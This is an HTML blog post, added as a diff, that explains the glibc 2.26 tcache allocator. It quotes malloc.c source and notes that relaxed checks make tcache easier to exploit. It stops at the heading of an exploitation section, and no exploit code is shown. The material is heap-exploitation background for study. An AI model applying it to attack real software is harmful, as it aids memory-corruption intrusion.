@@ -1,0 +1,720 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fox.jpg">
+  <link rel="icon" href="/img/fox.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="tcache作为libc2.26新加的机制,优先级高于fastbin,在提升速度的同时及完美的诠释了要速度就牺牲安全性这一定则。可以在这里找到当时新更新的代码。  代码分析tcache(thread local caching),作为一个优先级高于fastbin新的缓存cache，相比fastbin是提升了不少的性能，但与此同时，带来的副作用就是比fastbin更好利用。我们可以看看更新的内容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tcache.md">
+<meta property="og:url" content="https://nightrainy.github.io/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="知世の小屋">
+<meta property="og:description" content="tcache作为libc2.26新加的机制,优先级高于fastbin,在提升速度的同时及完美的诠释了要速度就牺牲安全性这一定则。可以在这里找到当时新更新的代码。  代码分析tcache(thread local caching),作为一个优先级高于fastbin新的缓存cache，相比fastbin是提升了不少的性能，但与此同时，带来的副作用就是比fastbin更好利用。我们可以看看更新的内容">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-07-11T14:03:19.000Z">
+<meta property="article:modified_time" content="2019-07-12T06:07:54.000Z">
+<meta property="article:author" content="知世">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>tcache.md - 知世の小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>知世</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rick.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="tcache.md"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-07-11 22:03" pubdate>
+          2019年7月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">tcache.md</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>tcache作为libc2.26新加的机制,优先级高于fastbin,在提升速度的同时及完美的诠释了要速度就牺牲安全性这一定则。可以在<a target="_blank" rel="noopener" href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">这里</a>找到当时新更新的代码。</p>
+</blockquote>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>tcache(thread local caching),作为一个优先级高于fastbin新的缓存cache，相比fastbin是提升了不少的性能，但与此同时，带来的副作用就是比fastbin更好利用。我们可以看看更新的内容</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs erlang">* config.make.in: Enable experimental malloc option.<br>* configure.ac: Likewise.<br>* configure: Regenerate.<br>* manual/install.texi: Document it.<br>* INSTALL: Regenerate.<br>* malloc/Makefile: Likewise.<br>* malloc/malloc.c: Add per-thread cache (tcache).<br>(tcache_put): New.<br>(tcache_get): New.<br>(tcache_thread_freeres): New.<br>(tcache_init): New.<br>(__libc_malloc): Use cached chunks <span class="hljs-keyword">if</span> available.<br>(__libc_free): Initialize tcache <span class="hljs-keyword">if</span> needed.<br>(__libc_realloc): Likewise.<br>(__libc_calloc): Likewise.<br>(_int_malloc): Prefill tcache <span class="hljs-keyword">when</span> appropriate.<br>(_int_free): Likewise.<br>(do_set_tcache_max): New.<br>(do_set_tcache_count): New.<br>(do_set_tcache_unsorted_limit): New.<br>* manual/probes.texi: Document new probes.<br>* malloc/arena.c: Add new tcache tunables.<br>* elf/dl-tunables.list: Likewise.<br>* manual/tunables.texi: Document them.<br>* NEWS: Mention the per-thread cache.<br></code></pre></td></tr></table></figure>
+
+<p>这里我们直接看malloc.c所加的代码</p>
+<h2 id="malloc-c"><a href="#malloc-c" class="headerlink" title="malloc.c"></a>malloc.c</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>先看下最前面所定义的东西:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">1</span> +<span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-number">2</span> +<span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-number">3</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS               64</span><br><span class="hljs-number">4</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZE       tidx2usize (TCACHE_MAX_BINS-1)</span><br><span class="hljs-number">5</span> +<br><span class="hljs-number">6</span> +<span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-number">7</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)       (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><span class="hljs-number">8</span> +<br><span class="hljs-number">9</span> +<span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-number">10</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-number">11</span> +<span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-number">12</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><span class="hljs-number">13</span> +<br><span class="hljs-number">14</span> +<span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">15 +   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">16 +   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">17 +   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">18 +   etc.  */</span><br><span class="hljs-number">19</span> +<br><span class="hljs-number">20</span> +<span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">21 +   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-number">22</span> +<span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-number">23</span> +<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>+<br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>可以看到规定tcache最多由64个Bins链接而成(第三行),而每一个bins里最多存放7个chunk(第21行)</li>
+<li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次.(15-17行)</li>
+</ul>
+<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>在tcache机制中新增了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs d">+<span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">+   the chunk is stored in the per-thread cache.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_entry<br>+&#123;<br>+  <span class="hljs-keyword">struct</span> tcache_entry *next;<br>+&#125; tcache_entry;<br>+<br>+<span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">+   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">+   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">+   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">+   time), this is for performance reasons.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_perthread_struct<br>+&#123;<br>+  <span class="hljs-built_in">char</span> counts[TCACHE_MAX_BINS];<br>+  tcache_entry *entries[TCACHE_MAX_BINS];<br>+&#125; tcache_perthread_struct;<br>+<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> <span class="hljs-built_in">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> tcache_perthread_struct *tcache = NULL;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>可以看到tcache_entry为单链表结构</li>
+<li>而tcache_perthread_struct为tcahch机制的主体<ol>
+<li>一个链表中内存块的最大数量为TCACHE_MAX_BINS即64;</li>
+<li>不同大小的单链表(64)</li>
+</ol>
+</li>
+</ul>
+<h3 id="两个新定义的函数-tcache-get-和tcache-put"><a href="#两个新定义的函数-tcache-get-和tcache-put" class="headerlink" title="两个新定义的函数(tcache_get 和tcache_put)"></a>两个新定义的函数(tcache_get 和tcache_put)</h3><p>这两个函数被用于在链表中取出和插入chunk</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xl">+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">+   for more chunks.  */</span><br>+static void<br>+tcache_put (mchunkptr chunk, size_t tc_idx)<br>+&#123;<br>+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = tcache-&gt;</span>entries[tc_idx];<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>entries[tc_idx] = e;<br>+  ++(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+&#125;<br>+<br>+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">+   available chunks to remove.  */</span><br>+static void *<br>+tcache_get (size_t tc_idx)<br>+&#123;<br>+  <span class="hljs-function"><span class="hljs-title">tcache_entry</span> *e = tcache-&gt;</span>entries[tc_idx];<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">assert</span> (tcache-&gt;</span>entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">entries</span>[tc_idx] = e-&gt;</span>next;<br>+  --(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+  return (void *) e;<br>+&#125;<br>+<br></code></pre></td></tr></table></figure>
+
+<p>可以看到开发者希望我们确信参数是合法的,但安全性而言,这完全是放开了检查机制,摒弃了安全性而只追求速度</p>
+<h3 id="tcache-thread-freeres"><a href="#tcache-thread-freeres" class="headerlink" title="tcache_thread_freeres"></a>tcache_thread_freeres</h3><p>用于清空当前线程的tcache</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+</span><br><span class="hljs-addition">+static void __attribute__ ((section (&quot;__libc_thread_freeres_fn&quot;)))</span><br><span class="hljs-addition">+tcache_thread_freeres (void)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+  int i;</span><br><span class="hljs-addition">+  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (!tcache)</span><br><span class="hljs-addition">+    return;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  tcache = NULL;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      while (tcache_tmp-&gt;entries[i])</span><br><span class="hljs-addition">+       &#123;</span><br><span class="hljs-addition">+         tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="hljs-addition">+         tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="hljs-addition">+         __libc_free (e);</span><br><span class="hljs-addition">+       &#125;</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  __libc_free (tcache_tmp);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  tcache_shutting_down = 1;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+text_set_element (__libc_thread_subfreeres, tcache_thread_freeres);</span><br><span class="hljs-addition">+</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init_"></a>tcache_init_</h3><p>初始化函数</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+static void</span><br><span class="hljs-addition">+tcache_init(void)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+  mstate ar_ptr;</span><br><span class="hljs-addition">+  void *victim = 0;</span><br><span class="hljs-addition">+  const size_t bytes = sizeof (tcache_perthread_struct);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (tcache_shutting_down)</span><br><span class="hljs-addition">+    return;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  arena_get (ar_ptr, bytes);</span><br><span class="hljs-addition">+  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="hljs-addition">+  if (!victim &amp;&amp; ar_ptr != NULL)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="hljs-addition">+      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  if (ar_ptr != NULL)</span><br><span class="hljs-addition">+    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  /* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-addition">+     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-addition">+     typically do this very early, so either there is sufficient</span><br><span class="hljs-addition">+     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-addition">+     allocations anyway.  */</span><br><span class="hljs-addition">+  if (victim)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      tcache = (tcache_perthread_struct *) victim;</span><br><span class="hljs-addition">+      memset (tcache, 0, sizeof (tcache_perthread_struct));</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到tcache的内存块是由_int_malloc_生成的</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+  /* int_free also calls request2size, be careful to not pad twice.  */</span><br><span class="hljs-addition">+  size_t tbytes = request2size (bytes);</span><br><span class="hljs-addition">+  size_t tc_idx = csize2tidx (tbytes);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  MAYBE_INIT_TCACHE ();</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="hljs-addition">+  if (tc_idx &lt; mp_.tcache_bins</span><br><span class="hljs-addition">+      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="hljs-addition">+      &amp;&amp; tcache</span><br><span class="hljs-addition">+      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="hljs-addition">+    &#123;</span><br><span class="hljs-addition">+      return tcache_get (tc_idx);</span><br><span class="hljs-addition">+    &#125;</span><br><span class="hljs-addition">+  DIAG_POP_NEEDS_COMMENT;</span><br><span class="hljs-addition">+#endif</span><br></code></pre></td></tr></table></figure>
+<p>这里主要检查了tcache和tcahce_list是否为空和参数是否越界的问题<br>如果没有问题就调用tcache_get函数</p>
+<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><p>而_int_malloc函数中是这么写的</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+         /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-addition">+            stash them in the tcache.  */</span><br><span class="hljs-addition">+         size_t tc_idx = csize2tidx (nb);</span><br><span class="hljs-addition">+         if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="hljs-addition">+           &#123;</span><br><span class="hljs-addition">+             mchunkptr tc_victim;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+             /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="hljs-addition">+             while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="hljs-addition">+                    &amp;&amp; (pp = *fb) != NULL)</span><br><span class="hljs-addition">+               &#123;</span><br><span class="hljs-addition">+                 REMOVE_FB (fb, tc_victim, pp);</span><br><span class="hljs-addition">+                 if (tc_victim != 0)</span><br><span class="hljs-addition">+                   &#123;</span><br><span class="hljs-addition">+                     tcache_put (tc_victim, tc_idx);</span><br><span class="hljs-addition">+                   &#125;</span><br><span class="hljs-addition">+               &#125;</span><br><span class="hljs-addition">+           &#125;</span><br><span class="hljs-addition">+#endif</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="init-free"><a href="#init-free" class="headerlink" title="_init_free"></a>_init_free</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+#if USE_TCACHE</span><br><span class="hljs-addition">+  &#123;</span><br><span class="hljs-addition">+    size_t tc_idx = csize2tidx (size);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+    if (tcache</span><br><span class="hljs-addition">+       &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="hljs-addition">+       &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="hljs-addition">+      &#123;</span><br><span class="hljs-addition">+       tcache_put (p, tc_idx);</span><br><span class="hljs-addition">+       return;</span><br><span class="hljs-addition">+      &#125;</span><br><span class="hljs-addition">+  &#125;</span><br><span class="hljs-addition">+#endif</span><br><span class="hljs-addition">+</span><br></code></pre></td></tr></table></figure>
+<p>先判断参数合法，相同大小chunk的数量在7个以内时，就进入 tcache_put()进行释放</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>tcache的优先级是最高的,在满足tcache所需size的chunk中,free后一定是先进入tcache的</li>
+<li>由于删减了一些检查机制,从而使得安全性急剧下降</li>
+</ul>
+<h1 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h1><blockquote>
+<p>这里引用ex师傅的一道题,顺便安利一下<a target="_blank" rel="noopener" href="http://blog.eonew.cn/">EX师傅的博客</a></p>
+</blockquote>
